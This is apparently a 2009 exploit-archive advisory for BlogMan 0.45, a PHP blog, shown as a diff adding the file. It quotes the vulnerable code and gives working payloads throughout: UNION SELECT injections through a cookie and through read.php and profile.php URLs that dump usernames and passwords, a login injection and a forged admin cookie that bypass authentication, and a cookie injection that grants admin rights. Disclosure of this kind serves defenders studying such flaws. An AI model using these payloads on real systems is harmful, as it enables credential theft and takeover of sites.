@@ -1,0 +1,169 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+
+Application:       BlogMan
+                          http://sourceforge.net/projects/blogman/
+Version:             0.45
+Bug:                   * Multiple SQL Injection
+                          * Authentication Bypass
+                          * Privilege Escalation
+Exploitation:      Remote
+Date:                 1 Mar 2009
+Discovered by:  Salvatore "drosophila" Fresta
+Author:              Salvatore "drosophila" Fresta
+                          e-mail: drosophilaxxx@gmail.com
+              	
+
+*************************************************
+
+- BUGS
+
+This blog is entirely vulnerable to SQL Injection.
+The following are vulnerable queries that can be used
+to obtain reserved information.
+
+#[1] SQL Injection:
+
+	Requisites: magic_quotes_gpc = off
+
+	File affected: index.php, register.php, viewall.php
+	
+	The following lines are improperly checked:
+	
+	/*
+		if (isset($_COOKIE['blogmanuserid'])) {
+			$id = $_COOKIE['blogmanuserid'];
+			$query = "SELECT * FROM user WHERE UserID='".$id."'";
+			$user = mysql_fetch_array(mysql_query($query)) or die(mysql_error());
+		    echo "<p class='loginusername'><a
+href='edit.php?id=".$id."'>".$user['UserName']."</a></p>\n";
+	*/
+	
+	Using a cookie editor it is possible to edit that cookie
+	and manage the query, as follows:
+	
+	Name: blogmanuserid
+	Content: -1' UNION ALL SELECT
+1,CONCAT(UserName,char(58),UserPassword),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+FROM user#
+	Server: target_server (example: localhost)
+	Path: /blogman/
+
+
+#[2] SQL Injection:
+
+	Requisites: magic_quotes_gpc = off
+
+	File affected: read.php
+	
+	This bug allows a guest to view the username
+	and password of a registered user.
+	
+	http://site/path/read.php?id=-1'UNION ALL SELECT
+NULL,2,CONCAT(UserName,char(58),UserPassword),NULL,5,6,7 FROM user%23
+	
+
+#[3] SQL Injection:
+
+	Requisites: magic_quotes_gpc = off
+
+	File affected: profile.php
+	
+	This bug allows a guest to view the username
+	and password of a registered user.
+	
+	http://site/path/profile.php?id=-1' UNION ALL SELECT
+1,CONCAT(UserName,char(58),UserPassword),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+FROM user%23
+
+
+#[1] Authentication Bypass:
+
+	Requisites: magic_quotes_gpc = off
+
+	File affected: doLogin.php
+	
+	The following lines are improperly checked:
+	
+	/*
+		$un = $_POST['un'];
+		$pw = $_POST['pw'];
+		
+		...
+		
+		$pwHashed = mysql_fetch_array(mysql_query("SELECT PASSWORD('".$pw."')"));
+		$userRow = mysql_fetch_array(mysql_query("SELECT * FROM user WHERE
+UserName='".$un."'"));
+	        if ($userRow['UserPassword'] == $pwHashed[0] &&
+$userRow['UserActive'] && !$userRow['UserDisabled']) {
+		    $expires = time() + 3*24*60*60;
+		    setcookie("blogmanuserid", $userRow['UserID'], $expires);
+	        }
+	*/
+	
+	Using a SQL Injection bug it is possible to bypass
+	conditions and to set an arbitrary UserID value.
+	
+	The following information must be sent using
+	POST method to doLogin.php
+	
+	un = ' UNION ALL SELECT
+1,NULL,PASSWORD('mypass'),NULL,NULL,NULL,NULL,NULL,NULL,0,1,NULL,NULL,NULL,NULL,NULL#
+	pw = mypass
+	
+	The First value is UserID, the third value is the password,
+	the tenth value is UserDisabled and the eleventh value is
+	UserActive.
+
+
+#[2] Authentication Bypass:
+
+	Requisites: none
+	
+	File affected: all
+	
+	It is possible to bypass the authentication
+	system by creating a cookie named 'blogmanuserid',
+	and inserting the value of a registered user id
+	into the content(sometimes 1 for admin):
+	
+	Name: blogmanuserid
+	Content: 1	
+	Server: target_server (example: localhost)
+	Path: /blogman/
+	
+	
+Privilege Escalation:
+
+	Requisites: magic_quotes_gpc = off
+
+	File affected: admin.php
+	
+	It is possible to escalate privileges using
+	a SQL Injection bug through a cookie.
+	
+	The following lines are improperly checked:
+	
+	/*
+	        $id = $_COOKIE['blogmanuserid'];
+		$user = mysql_fetch_array(mysql_query("SELECT * FROM user WHERE
+UserID='".$id."'"));
+		if (!$user['UserCanAdmin']) {
+			echo "<meta http-equiv='refresh' content='0;index.php'></head></html>";
+		} else {
+			...
+		}
+	*/
+	
+	Name: blogmanuserid
+	Content: -1' UNION ALL SELECT 2,NULL,3,4,5,6,7,8,9,10,11,12,13,14,15,1#	
+	Server: target_server (example: localhost)
+	Path: /blogman/
+	
+	The first value is UserID and the last value
+	is UserCanAdmin.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-02]
